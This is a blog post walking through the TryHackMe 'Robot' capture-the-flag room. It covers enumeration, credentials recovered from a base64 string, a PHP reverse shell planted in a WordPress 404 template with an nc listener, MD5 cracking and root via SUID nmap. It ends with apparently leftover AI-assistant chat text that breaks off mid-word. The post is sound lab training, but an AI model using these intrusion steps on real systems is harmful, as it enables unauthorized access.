---
layout: post  # Use your theme's default post layout, or 'page' if it's a static page
title: "Tryhackme Mr robot Walkthrough - Pentest Lab Notes"
date: 2025-06-14 12:00:00 -0500  # Adjust timezone if needed
categories: [tryhackme, walkthrough]
tags: ctf, enumeration, exploit, Mr robot, writeups, htb, writeups tryhackme walkthrough
author: h4ck3rfirst
---
# 🤖 TryHackMe: Robot Room - Walkthrough

Welcome to the walkthrough of the **Robot** room on [TryHackMe](https://tryhackme.com/room/robot), inspired by the *Mr. Robot* TV series. This lab focuses on web enumeration, WordPress exploitation, hash cracking, and privilege escalation techniques.

---

## 🧠 Room Information

- **Platform**: TryHackMe
- **Room Name**: Robot
- **Difficulty**: Easy–Intermediate
- **Skills Covered**:
  - Web Enumeration
  - WordPress Vulnerabilities
  - Password Hash Cracking
  - Shell Access
  - Privilege Escalation

---

## 🔍 Recon & Enumeration

```bash
nmap -sC -sV -Pn <TARGET_IP>
nmap -A <TARGET_IP>
```
Discovered Open Ports:

    80/tcp — HTTP

    443/tcp — HTTPS

Directory Brute Forcing:
```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Interesting Endpoints:

    /robots.txt

    /license

    /wp-login.php

🚩 Flag 1 - Found in robots.txt

Accessing /robots.txt shows:

User-agent: *
Disallow: /key-1-of-3.txt

Visiting that file reveals:

073403c8---------------------

# 🔐 Credential Discovery

From /license, we find a Base64-encoded string. Decoding:

echo 'R________________Mg==' | base64 -d

Reveals credentials:

elliot:ER28------2

# 💥 WordPress Exploitation

    Log into /wp-login.php using Elliot's credentials.

    Go to Appearance → Theme Editor.

    Modify the 404.php template with a PHP reverse shell.

    Start listener:
```
nc -lvnp 4444
```
    Trigger shell by visiting a nonexistent URL.

# 🧠 Shell Access & Enumeration

Stabilize shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Found key-2-of-3.txt in /home/robot/ (not readable).

Also found password.raw-md5:

c3fcd3d76192e--------------3b

Cracked using CrackStation:
➡️ Password = abcdefghijklmnopqrstuvwxyz

Switch to robot:

```
su robot
```
Now access:

822c73956----------------9f959

# ⚙️ Privilege Escalation

Check for SUID files:
```
find / -perm -4000 -type f 2>/dev/null
```
Found: /usr/local/bin/nmap

Interactive Nmap exploit (via GTFOBins):
```
nmap --interactive
!sh
```
Now root! 🚀
🏁 Final Flag
```
Read /root/key-3-of-3.txt:
```
# 📚 Tools & Resources Used

    Nmap

    Gobuster

    CrackStation

    GTFOBins

    PentestMonkey PHP Shell

✍️ Author

Your nikhil

---

### ✅ To Use:
- Replace `<TARGET_IP>` with the IP of your deployed machine (or remove if not sharing actual commands).
- Update your name and links at the bottom.
- Save this as `README.md` in your GitHub repository.

Let me know if you'd like me to help format this in a GitHub repo directly, or generate an accompany